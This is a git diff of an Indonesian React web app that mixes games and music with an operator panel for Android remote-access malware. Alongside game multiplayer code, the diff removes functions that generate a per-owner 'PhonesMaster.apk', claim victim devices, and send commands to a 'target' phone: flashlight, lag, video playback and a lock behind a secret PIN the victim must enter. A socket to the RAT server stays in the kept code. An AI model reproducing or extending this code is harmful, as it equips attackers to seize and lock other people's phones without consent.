@@ -11,12 +11,11 @@ import {
   Clock, Shield, Phone, Link, Mail, MapPin,
   CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
   Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle,
-  Swords, Package, Youtube, Image as ImageIcon, Terminal, Award, Sparkles, Moon
+  Swords, Package, Youtube, Image as ImageIcon, Terminal, Trophy, Star, Moon
 } from "lucide-react";
 
 import {
-  GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe,
-  unoInit, ularInit, tttInit
+  GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe
 } from "./gameEngine";
 
 const API_URL = "https://api-mikasacloud.my.id";
@@ -208,15 +207,7 @@ export default function Home() {
 
   const [activeGame, setActiveGame] = useState(null);
   const [gameMode, setGameMode] = useState(null);
-  const [gameState, setGameState] = useState(null);
-  const [gameRoomId, setGameRoomId] = useState(null);
-  const [gameOpponent, setGameOpponent] = useState(null);
-  const [gameMyColor, setGameMyColor] = useState(null);
   const [gameLevel, setGameLevel] = useState("medium");
-  const [isQueueing, setIsQueueing] = useState(false);
-  const [gameMessage, setGameMessage] = useState("");
-  const [roomNameInput, setRoomNameInput] = useState("");
-  const [roomKeyInput, setRoomKeyInput] = useState("");
 
   const [musicSearch, setMusicSearch] = useState("");
   const [musicResults, setMusicResults] = useState([]);
@@ -394,35 +385,6 @@ export default function Home() {
         if (snapshot && typeof snapshot[username] === "number") setUnreadTotal(snapshot[username]);
       });
 
-      newSocket.on('game_queue_joined', ({ game }) => {
-        setIsQueueing(true);
-        setGameMessage(`Menunggu lawan ${game}...`);
-      });
-
-      newSocket.on('game_matched', ({ roomId, game, opponent, myColor, opponentColor }) => {
-        setIsQueueing(false);
-        setGameRoomId(roomId);
-        setGameOpponent(opponent);
-        setGameMyColor(myColor);
-        setGameMessage("");
-        let init = null;
-        if (game === 'uno') init = unoInit();
-        else if (game === 'ular') init = ularInit();
-        else if (game === 'tictactoe') init = tttInit();
-        setGameState(init);
-        setGameMode('pvp');
-      });
-
-      newSocket.on('game_opponent_move', ({ move }) => {
-        setGameState((prev) => (prev ? { ...prev, ...move } : prev));
-      });
-
-      newSocket.on('game_opponent_left', () => {
-        setGameMessage("Lawan keluar dari room");
-        setGameRoomId(null);
-        setGameOpponent(null);
-      });
-
       const s = io(API_URL, { transports: ["websocket"] });
       setRatSocket(s);
 
@@ -480,57 +442,6 @@ export default function Home() {
       setUnreadTotal((t) => Math.max(0, t - decrement));
       return copy;
     });
-  };
-
-  const startNpcGame = (gameId) => {
-    setActiveGame(gameId);
-    setGameMode('npc');
-    setGameState(null);
-    setGameRoomId(null);
-    setGameOpponent(null);
-    setGameMyColor(gameId === 'catur' ? 'w' : gameId === 'tictactoe' ? 'X' : 0);
-    setGameMessage("");
-  };
-
-  const startQueue = (gameId) => {
-    if (!socket) return;
-    setActiveGame(gameId);
-    setGameMode('pvp');
-    setGameState(null);
-    setGameRoomId(null);
-    setGameOpponent(null);
-    setGameMessage("Menghubungkan ke server...");
-    socket.emit('game_join_queue', { game: gameId, username, roomName: roomNameInput, roomKey: roomKeyInput });
-  };
-
-  const leaveQueue = () => {
-    if (socket && activeGame) {
-      socket.emit('game_leave_queue', { game: activeGame });
-    }
-    setIsQueueing(false);
-    setGameMessage("");
-  };
-
-  const exitGame = () => {
-    if (socket && gameRoomId) {
-      socket.emit('game_leave', { roomId: gameRoomId });
-    }
-    if (socket && activeGame) {
-      socket.emit('game_leave_queue', { game: activeGame });
-    }
-    setActiveGame(null);
-    setGameMode(null);
-    setGameState(null);
-    setGameRoomId(null);
-    setGameOpponent(null);
-    setIsQueueing(false);
-    setGameMessage("");
-  };
-
-  const handleGameMove = (move) => {
-    if (gameMode === 'pvp' && socket && gameRoomId) {
-      socket.emit('game_move', { roomId: gameRoomId, username, move });
-    }
   };
 
   const handleGameWin = () => {
@@ -612,54 +523,6 @@ export default function Home() {
         bgmAudio.play().catch(e => console.log(e));
       };
     }).catch(e => console.log("Autoplay blocked:", e));
-  };
-
-  const handleGenerateAPK = async () => {
-    setIsGenerating(true);
-    try {
-      const response = await fetch(`${API_URL}/generate-apk`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ownerId: username })
-      });
-      if (!response.ok) throw new Error("Gagal download");
-      const blob = await response.blob();
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `PhonesMaster.apk`;
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-    } catch (err) { alert("Terjadi kesalahan saat generate APK."); }
-    finally { setIsGenerating(false); }
-  };
-
-  const claimDevice = (deviceId) => {
-    if (!ratSocket) return;
-    ratSocket.emit("rat_claim_device", { deviceId, ownerId: username });
-  };
-
-  const toggleRat = async (key, pin = null) => {
-    if (!ratTargetId) return alert("Pilih target dulu bre!");
-    if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung!");
-    if (key === 'lock' && !ratStates.lock && !pin) { setShowPinModal(true); return; }
-    const newState = !ratStates[key];
-    setRatStates(prev => ({ ...prev, [key]: newState }));
-    let command = "";
-    if (key === 'flashlight') command = newState ? "flashlight_on" : "flashlight_off";
-    if (key === 'lock') command = newState ? "lock" : "unlock";
-    if (key === 'video') command = newState ? "play_video" : "stop_video";
-    if (key === 'lag') command = newState ? "lag_on" : "lag_off";
-    setRatLoading(true);
-    ratSocket.emit("rat_command", { deviceId: ratTargetId, command, ownerId: username, pin });
-    setTimeout(() => setRatLoading(false), 1000);
-  };
-
-  const submitLock = () => {
-    if (lockPin.length < 4) return alert("PIN minimal 4 angka!");
-    setShowPinModal(false);
-    toggleRat('lock', lockPin);
   };
 
   const executeTool = async () => {
@@ -915,152 +778,22 @@ export default function Home() {
     );
   };
 
-  const renderPinModal = () => {
-    if (!showPinModal) return null;
-    return (
-      <div className="fixed inset-0 bg-black/80 z-[999] flex items-center justify-center p-4">
-        <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl w-full max-w-sm p-6 relative">
-          <button onClick={() => setShowPinModal(false)} className="absolute top-4 right-4 text-zinc-400"><X size={20}/></button>
-          <h2 className="text-white font-bold text-lg mb-2">Kunci HP Target</h2>
-          <p className="text-xs text-zinc-400 mb-4">Masukkan PIN rahasia. Target harus memasukkan PIN ini untuk membuka HP.</p>
-          <div className="space-y-4">
-            <div>
-              <label className="text-xs text-zinc-400 block mb-1">PIN Rahasia</label>
-              <input type="text" value={lockPin} onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))} className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest" placeholder="Contoh: 123456" maxLength={8} />
-            </div>
-            <button onClick={submitLock} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex justify-center items-center transition-colors"><Lock size={20} className="mr-2" /> Kunci Sekarang!</button>
-          </div>
-        </div>
-      </div>
-    );
-  };
-
   if (activeGame) {
-    const gameObj = GAMES.find(g => g.id === activeGame);
-    const inLobby = gameMode === null;
-    const inQueue = isQueueing;
-
     return (
       <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans flex flex-col">
         <header className="p-4 flex items-center justify-between sticky top-0 bg-[#0f0a15]/90 backdrop-blur-md z-30 border-b border-zinc-800 shrink-0">
-          <button onClick={exitGame} className="text-white p-2"><ChevronLeft size={24} /></button>
-          <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">{gameObj?.title}</h1>
-          {gameMode === 'pvp' && gameOpponent && (
-            <span className="text-xs text-emerald-400 bg-emerald-900/30 border border-emerald-700 px-2 py-1 rounded-lg">
-              vs {gameOpponent}
-            </span>
-          )}
+          <button onClick={() => setActiveGame(null)} className="text-white p-2"><ChevronLeft size={24} /></button>
+          <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">{activeGame}</h1>
         </header>
-
         <main className="flex-1 px-4 py-4 max-w-md mx-auto w-full">
-          {inLobby && (
-            <div className="space-y-4">
-              <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 text-center">
-                <div className="w-16 h-16 mx-auto bg-[#0f0a15] rounded-2xl flex items-center justify-center mb-3">{gameObj?.icon}</div>
-                <h2 className="text-white text-2xl font-bold">{gameObj?.title}</h2>
-                <p className="text-xs text-zinc-400 mt-1">{gameObj?.desc}</p>
-              </div>
-
-              <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
-                <h3 className="text-white font-bold text-sm mb-3">Pilih Level (vs NPC)</h3>
-                <div className="grid grid-cols-3 gap-2 mb-3">
-                  {['easy', 'medium', 'hard'].map(lvl => (
-                    <button key={lvl} onClick={() => setGameLevel(lvl)} className={`py-2 rounded-lg text-xs font-bold capitalize ${gameLevel === lvl ? 'bg-zinc-600 text-white' : 'bg-zinc-800 text-zinc-400 border border-zinc-700'}`}>{lvl}</button>
-                  ))}
-                </div>
-                <button onClick={() => startNpcGame(activeGame)} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">
-                  <Gamepad2 size={18} /> Main vs NPC
-                </button>
-              </div>
-
-              <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
-                <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Swords size={16} className="text-red-400" /> Multiplayer Online</h3>
-                <div className="space-y-3 mb-3">
-                  <input type="text" value={roomNameInput} onChange={(e) => setRoomNameInput(e.target.value)} placeholder="Nama Room (wajib)" className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-2 text-sm text-white focus:outline-none" />
-                  <input type="text" value={roomKeyInput} onChange={(e) => setRoomKeyInput(e.target.value)} placeholder="Key Room (kosongkan jika publik)" className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-2 text-sm text-white focus:outline-none" />
-                </div>
-                <button onClick={() => startQueue(activeGame)} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">
-                  <Users size={18} /> Buat / Cari Room
-                </button>
-              </div>
-            </div>
-          )}
-
-          {inQueue && (
-            <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-6 text-center space-y-4 mt-6">
-              <div className="w-20 h-20 mx-auto rounded-full bg-blue-900/30 border border-blue-700 flex items-center justify-center">
-                <Loader2 size={36} className="animate-spin text-blue-400" />
-              </div>
-              <div>
-                <h2 className="text-white font-bold">Mencari Lawan...</h2>
-                <p className="text-xs text-zinc-400 mt-1">{gameMessage}</p>
-              </div>
-              <button onClick={leaveQueue} className="w-full bg-zinc-700 hover:bg-zinc-600 text-white font-bold py-3 rounded-lg">Batal</button>
-            </div>
-          )}
-
-          {gameMode === 'npc' && !inQueue && (
-            <div className="bg-[#0f0a15] rounded-2xl">
-              {activeGame === 'catur' && <GameCatur level={gameLevel} mode="npc" myColor="w" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'uno' && <GameUno mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'ular' && <GameUlarTangga mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'spy' && <GameSpy mode="npc" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'tictactoe' && <GameTicTacToe level={gameLevel} mode="npc" myMark="X" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-            </div>
-          )}
-
-          {gameMode === 'pvp' && !inQueue && !gameRoomId && (
-            <div className="text-center py-10">
-              <Loader2 size={32} className="animate-spin text-zinc-500 mx-auto mb-3" />
-              <p className="text-zinc-500 text-sm">{gameMessage || "Menunggu match..."}</p>
-              <button onClick={exitGame} className="mt-4 bg-zinc-700 text-white px-4 py-2 rounded-lg text-sm">Batal</button>
-            </div>
-          )}
-
-          {gameMode === 'pvp' && gameRoomId && (
-            <div className="bg-[#0f0a15] rounded-2xl">
-              {gameMessage && (
-                <div className="bg-red-900/30 border border-red-700 text-red-300 text-xs p-2 rounded-lg mb-3 text-center">{gameMessage}</div>
-              )}
-              {activeGame === 'catur' && <GameCatur mode="pvp" myColor={gameMyColor} opponentName={gameOpponent} serverFen={gameState?.fen || null} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'uno' && <GameUno mode="pvp" mySeat={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'ular' && <GameUlarTangga mode="pvp" mySeat={gameMyColor} serverState={gameState} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'spy' && <GameSpy mode="pvp" serverState={gameState} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'tictactoe' && <GameTicTacToe mode="pvp" myMark={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-            </div>
-          )}
+          <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4 shadow-xl">
+            {activeGame === 'catur' && <GameCatur level={gameLevel} onClose={() => setActiveGame(null)} />}
+            {activeGame === 'uno' && <GameUno onClose={() => setActiveGame(null)} />}
+            {activeGame === 'ular' && <GameUlarTangga onClose={() => setActiveGame(null)} />}
+            {activeGame === 'spy' && <GameSpy onClose={() => setActiveGame(null)} />}
+            {activeGame === 'tictactoe' && <GameTicTacToe level={gameLevel} onClose={() => setActiveGame(null)} />}
+          </div>
         </main>
-      </div>
-    );
-  }
-
-  if (showRanking) {
-    return (
-      <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans flex flex-col p-4">
-        <div className="flex items-center gap-3 mb-6">
-          <button onClick={() => setShowRanking(false)} className="p-2 bg-[#1c1c1e] border border-zinc-700 rounded-lg text-zinc-400"><ChevronLeft size={20}/></button>
-          <h1 className="text-white font-bold text-xl">Papan Peringkat</h1>
-        </div>
-        <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-6 text-center mb-6">
-          <Trophy size={48} className="mx-auto text-yellow-500 mb-2" />
-          <p className="text-zinc-400 text-sm">Total Poin Kamu</p>
-          <p className="text-4xl font-bold text-white mt-1">{gamePoints}</p>
-        </div>
-        <div className="space-y-3">
-          {GAMES.sort((a,b) => b.points - a.points).map((g, i) => (
-            <div key={g.id} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-4 flex items-center justify-between">
-              <div className="flex items-center gap-3">
-                <span className="text-zinc-500 font-bold w-4">{i+1}</span>
-                <div className="w-10 h-10 bg-[#0f0a15] rounded-lg flex items-center justify-center">{g.icon}</div>
-                <div>
-                  <h3 className="text-white font-bold text-sm">{g.title}</h3>
-                  <p className="text-[10px] text-zinc-500">Poin Menang: {g.points}</p>
-                </div>
-              </div>
-              <Star size={20} className={i === 0 ? "text-yellow-500" : i === 1 ? "text-zinc-400" : i === 2 ? "text-amber-600" : "text-zinc-700"} />
-            </div>
-          ))}
-        </div>
       </div>
     );
   }
@@ -1089,7 +822,6 @@ export default function Home() {
       {renderSidebar()}
       {renderProfileModal()}
       {renderSenderModal()}
-      {renderPinModal()}
 
       <main className="px-4 max-w-md mx-auto mt-2 space-y-6">
         {activeTab === "home" && (
